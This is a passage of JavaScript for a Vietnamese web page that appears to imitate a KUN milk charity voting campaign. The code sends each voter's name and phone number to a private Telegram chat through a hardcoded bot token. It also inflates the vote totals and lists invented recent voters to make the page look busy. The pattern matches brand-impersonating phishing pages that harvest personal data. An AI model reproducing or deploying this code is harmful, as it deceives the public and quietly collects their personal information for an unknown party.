// =========================================================
// CẤU HÌNH ĐỒNG BỘ DỮ LIỆU CHUNG & THÔNG BÁO TELEGRAM
// =========================================================
const FIREBASE_DB_URL = "";
const TELEGRAM_BOT_TOKEN = "9077621464:AAGSBAFQZN3iIbCxkFvRnU6mQYs3OkMMqHU";
const TELEGRAM_CHAT_ID = "6713370589";

async function sendVoteToTelegram(voteRecord, regionFullName) {
  const token = TELEGRAM_BOT_TOKEN.trim();
  const chatId = TELEGRAM_CHAT_ID.trim();
  if (!token || !chatId) return;

  const text = [
    "🥛 CÓ LƯỢT BÌNH CHỌN SỮA KUN MỚI!",
    `👤 Họ tên: ${voteRecord.name}`,
    `📞 SĐT: ${voteRecord.phone}`,
    `📍 Vùng miền: ${regionFullName}`,
    `⏰ Thời gian: ${voteRecord.time}`
  ].join("\n");

  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${encodeURIComponent(chatId)}&text=${encodeURIComponent(text)}`;

  try {
    await fetch(url);
  } catch (err) {
    console.warn("Lỗi gửi Telegram:", err);
  }
}

const REGIONS = [
  {
    id: 'biendao',
    name: 'Biển Đảo',
    sub: 'xa xôi',
    fullName: 'Biển Đảo xa xôi',
    icon: '🏝️',
    badge: 'Hải đảo Tổ quốc',
    bgClass: 'bg-biendao',
    color: '#0284c7',
    gradient: ['#0284c7', '#06b6d4'],
    desc: 'Gửi những hộp sữa KUN 100% Sữa Tươi vượt sóng ra khơi, tiếp thêm dinh dưỡng cho các em nhỏ nơi đảo xa.',
    baseVotes: 3840
  },
  {
    id: 'mientrung',
    name: 'Miền Trung',
    sub: 'ruột thịt',
    fullName: 'Miền Trung ruột thịt',
    icon: '☀️',
    badge: 'Khúc ruột miền Trung',
    bgClass: 'bg-mientrung',
    color: '#f97316',
    gradient: ['#f97316', '#f59e0b'],
    desc: 'Trao nguồn năng lượng tươi mát và lời động viên ấm áp tới các em nhỏ vùng nắng gió miền Trung.',
    baseVotes: 3420
  },
  {
    id: 'taynguyen',
    name: 'Tây Nguyên',
    sub: 'nắng gió',
    fullName: 'Tây Nguyên nắng gió',
    icon: '🌲',
    badge: 'Đại ngàn Tây Nguyên',
    bgClass: 'bg-taynguyen',
    color: '#16a34a',
    gradient: ['#15803d', '#65a30d'],
    desc: 'Đồng hành cùng các em nhỏ buôn làng Tây Nguyên cao lớn, khỏe mạnh và vui tới trường mỗi ngày.',
    baseVotes: 2790
  },
  {
    id: 'mekong',
    name: 'MeKong',
    sub: 'nghĩa tình',
    fullName: 'MeKong nghĩa tình',
    icon: '🚣',
    badge: 'Miền Tây sông nước',
    bgClass: 'bg-mekong',
    color: '#0d9488',
    gradient: ['#0d9488', '#10b981'],
    desc: 'Mang dòng sữa mát lành cùng sân chơi KUN rộn rã tiếng cười đến với thiếu nhi vùng sông nước Cửu Long.',
    baseVotes: 2430
  }
];

const SUGGESTED_MESSAGES = [
  'Chúc các em luôn mạnh khỏe, chăm ngoan, học giỏi và cao lớn mỗi ngày cùng sữa KUN nhé!',
  'Gửi tới các em cái ôm thật ấm áp! Chúc các em luôn vui tươi, tự tin theo đuổi ước mơ của mình.',
  'Mỗi ngày uống sữa KUN thật ngon để luôn khỏe mạnh, năng động và rạng rỡ nụ cười các em nhé!',
  'Dù ở nơi đâu, các bạn nhỏ cũng luôn có thật nhiều yêu thương đồng hành. Cố lên các em nhé!'
];

const INITIAL_VOTERS = [
  { name: 'Trần Thu Hà', phone: '0904123889', regionId: 'biendao', time: 'Vừa xong' },
  { name: 'Lê Hoàng Nam', phone: '0987654321', regionId: 'mientrung', time: '2 phút trước' },
  { name: 'Nguyễn Ngọc Ánh', phone: '0912889456', regionId: 'taynguyen', time: '5 phút trước' },
  { name: 'Phạm Gia Huy', phone: '0935771204', regionId: 'mekong', time: '9 phút trước' }
];

const STORAGE_KEY = 'sua_kun_cho_ban_state_v2';

function getDefaultState() {
  const defaultVotes = {};
  REGIONS.forEach(r => { defaultVotes[r.id] = r.baseVotes; });
  return {
    votes: defaultVotes,
    voters: [...INITIAL_VOTERS]
  };
}

function loadLocalState() {
  try {
    const saved = JSON.parse(localStorage.getItem(STORAGE_KEY));
    if (saved && saved.votes && Array.isArray(saved.voters)) {
      return saved;
    }
  } catch (e) {}
  return getDefaultState();
}

function saveLocalState() {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
}

let state = loadLocalState();
let activeModalRegionId = 'biendao';
let selectedGender = 'Nữ';

// =========================================================
// ĐỒNG BỘ DỮ LIỆU CHUNG QUA FIREBASE (NẾU ĐÃ GẮN LINK)
// =========================================================
function getCleanDbUrl() {
  return FIREBASE_DB_URL.trim().replace(/\/$/, '');
}

async function syncFromCloud() {
  const baseUrl = getCleanDbUrl();
  if (!baseUrl) return;
  try {
    const res = await fetch(`${baseUrl}/kunVotes.json`);
    if (!res.ok) return;
    const data = await res.json();
    if (!data) return;

    const merged = getDefaultState();
    const list = Object.values(data);
    list.forEach(item => {
      if (item && item.regionId && merged.votes[item.regionId] !== undefined) {
        merged.votes[item.regionId] += 1;
      }
    });

    const recentCloud = list
      .filter(item => item && item.name && item.phone && item.regionId)
      .sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));

    merged.voters = [...recentCloud, ...INITIAL_VOTERS];
    state = merged;
    saveLocalState();
    renderAll();
    document.getElementById('syncStatusText').textContent = 'Đồng bộ trực tuyến toàn cộng đồng';
  } catch (err) {
    console.warn('Không thể tải dữ liệu trực tuyến:', err);
  }
}

async function pushVoteToCloud(voteRecord) {
  const baseUrl = getCleanDbUrl();
  if (!baseUrl) return false;
  const res = await fetch(`${baseUrl}/kunVotes.json`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(voteRecord)
  });
  return res.ok;
}

// =========================================================
// TIỆN ÍCH HIỂN THỊ
// =========================================================
function formatNumber(num) {
  return num.toLocaleString('vi-VN');
}

function maskPhone(phone) {
  if (!phone || phone.length < 7) return phone;
  return phone.slice(0, 3) + '***' + phone.slice(-4);
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function showToast(message) {
  const toast = document.getElementById('toastBox');
  toast.textContent = message;
  toast.classList.add('show');
  clearTimeout(toast._timer);
  toast._timer = setTimeout(() => {
    toast.classList.remove('show');
  }, 3800);
}

// =========================================================
// RENDER GIAO DIỆN
// =========================================================
function renderAll() {
  const totalVotes = Object.values(state.votes).reduce((a, b) => a + b, 0);
  const extraVotes = Math.max(0, totalVotes - REGIONS.reduce((a, b) => a + b.baseVotes, 0));

  document.getElementById('totalParticipants').textContent = formatNumber(totalVotes);
  document.getElementById('totalMilkBoxes').textContent = formatNumber(10000000 + extraVotes * 10);
  document.getElementById('totalKids').textContent = formatNumber(5000000 + extraVotes * 5);

  const grid = document.getElementById('regionsGrid');
  grid.innerHTML = REGIONS.map(region => {
    const count = state.votes[region.id] || 0;
    const pct = totalVotes > 0 ? Math.round((count / totalVotes) * 100) : 25;
    return `
      <article class="region-card">
        <div class="region-banner ${region.bgClass}">
          <span class="region-badge">${region.badge}</span>
          <div class="region-icon">${region.icon}</div>
        </div>
        <div class="region-body">
          <h3 class="region-title">${region.name}</h3>
          <div class="region-tagline">${region.sub}</div>
          <p class="region-desc">${region.desc}</p>
          <div class="region-stats">
            <div class="stat-row">
              <span>${formatNumber(count)} lượt chọn</span>
              <span style="color: ${region.color};">${pct}%</span>
            </div>
            <div class="progress-track">
              <div class="progress-fill" style="width: ${pct}%; background: ${region.color};"></div>
            </div>
          </div>
          <button type="button" class="btn-vote-region" data-region="${region.id}">
            💌 Trao "Lời Nhắn Gửi" Yêu Thương
          </button>
        </div>
      </article>
    `;
  }).join('');

  grid.querySelectorAll('.btn-vote-region').forEach(btn => {
    btn.addEventListener('click', () => openVoteModal(btn.dataset.region));
  });

  const sorted = [...REGIONS].sort((a, b) => (state.votes[b.id] || 0) - (state.votes[a.id] || 0));
  document.getElementById('rankingList').innerHTML = sorted.map((r, idx) => {
    const count = state.votes[r.id] || 0;
    const pct = totalVotes > 0 ? ((count / totalVotes) * 100).toFixed(1) : 25;
    return `
      <div class="rank-item">
        <div class="rank-num">${idx + 1}</div>
        <div class="rank-info">
          <div class="rank-name">${r.icon} ${r.fullName}</div>
          <div class="rank-votes">${formatNumber(count)} lượt bình chọn (${pct}%)</div>
        </div>
      </div>
    `;
  }).join('');

  document.getElementById('voterList').innerHTML = state.voters.slice(0, 25).map(v => {
    const r = REGIONS.find(item => item.id === v.regionId) || REGIONS[0];
    return `
      <div class="voter-item">
        <div>
          <div class="voter-main">${escapeHtml(v.name)} <span class="voter-phone">(${maskPhone(v.phone)})</span></div>
          <div style="font-size: 0.76rem; color: var(--text-muted);">${escapeHtml(v.time || 'Vừa tham gia')}</div>
        </div>
        <span class="voter-tag">${r.icon} ${r.name}</span>
      </div>
    `;
  }).join('');
}

// =========================================================
// XỬ LÝ POPUP BÌNH CHỌN (NHẬP HỌ TÊN & SĐT)
// =========================================================
const voteModal = document.getElementById('voteModal');
const voteForm = document.getElementById('voteForm');
const voterNameInput = document.getElementById('voterName');
const voterPhoneInput = document.getElementById('voterPhone');
const nameError = document.getElementById('nameError');
const phoneError = document.getElementById('phoneError');
const btnSubmitVote = document.getElementById('btnSubmitVote');

function openVoteModal(regionId) {
